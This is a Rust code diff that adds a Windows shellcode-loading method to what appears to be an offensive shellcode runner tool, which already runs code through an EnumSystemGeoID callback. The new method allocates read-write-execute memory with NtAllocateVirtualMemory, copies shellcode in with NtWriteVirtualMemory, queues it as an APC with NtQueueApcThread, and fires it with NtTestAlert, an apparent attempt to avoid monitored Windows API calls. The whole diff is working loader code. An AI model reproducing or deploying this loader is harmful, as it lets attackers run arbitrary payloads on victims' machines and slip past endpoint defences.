@@ -13,6 +13,16 @@ use winapi::um::winnls::{EnumSystemGeoID, GEO_ENUMPROC};
 #[cfg(windows)]
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
 
+use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory};
+use ntapi::ntpsapi::{
+    NtCurrentProcess, NtCurrentThread, NtQueueApcThread, NtTestAlert, PPS_APC_ROUTINE,
+};
+use ntapi::winapi::ctypes::c_void;
+
+use std::ptr::null_mut;
+
+
+
 use bstr::ByteSlice;
 use serde_derive::{Deserialize, Serialize};
 
@@ -244,6 +254,81 @@ impl ShellCode {
                 0,
                 mem::transmute::<*mut std::ffi::c_void, GEO_ENUMPROC>(base_addr),
             );
+        }
+    }
+
+    #[cfg(unix)]
+    pub fn load_directSyscalls(self) {
+        println!("[+] not supported on unix");
+    }
+
+    #[cfg(windows)]
+    pub fn load_directSyscalls(self) {
+        unsafe {
+            let mut allocstart: *mut c_void = null_mut();
+            let mut seize: usize = self.sc.len();
+
+            /*
+            pub unsafe extern "system" fn NtAllocateVirtualMemory(
+                ProcessHandle: HANDLE,
+                BaseAddress: *mut PVOID,
+                ZeroBits: ULONG_PTR,
+                RegionSize: PSIZE_T,
+                AllocationType: ULONG,
+                Protect: ULONG
+            ) -> NTSTATUS
+            */
+
+            NtAllocateVirtualMemory(
+                NtCurrentProcess,
+                &mut allocstart,
+                0,
+                &mut seize,
+                0x00003000,
+                0x40,
+            );
+
+            /*
+            pub unsafe extern "system" fn NtWriteVirtualMemory(
+                ProcessHandle: HANDLE,
+                BaseAddress: PVOID,
+                Buffer: PVOID,
+                BufferSize: SIZE_T,
+                NumberOfBytesWritten: PSIZE_T
+            ) -> NTSTATUS
+            */
+
+            NtWriteVirtualMemory(
+                NtCurrentProcess,
+                allocstart,
+                self.sc.as_ptr() as _,
+                self.sc.len() as usize,
+                null_mut(),
+            );
+
+            /*
+            pub unsafe extern "system" fn NtQueueApcThread(
+                ThreadHandle: HANDLE,
+                ApcRoutine: PPS_APC_ROUTINE,
+                ApcArgument1: PVOID,
+                ApcArgument2: PVOID,
+                ApcArgument3: PVOID
+            ) -> NTSTATUS
+            */
+
+            NtQueueApcThread(
+                NtCurrentThread,
+                Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE,
+                allocstart,
+                null_mut(),
+                null_mut(),
+            );
+
+            /*
+            pub unsafe extern "system" fn NtTestAlert() -> NTSTATUS
+            */
+
+            NtTestAlert();
         }
     }
 }
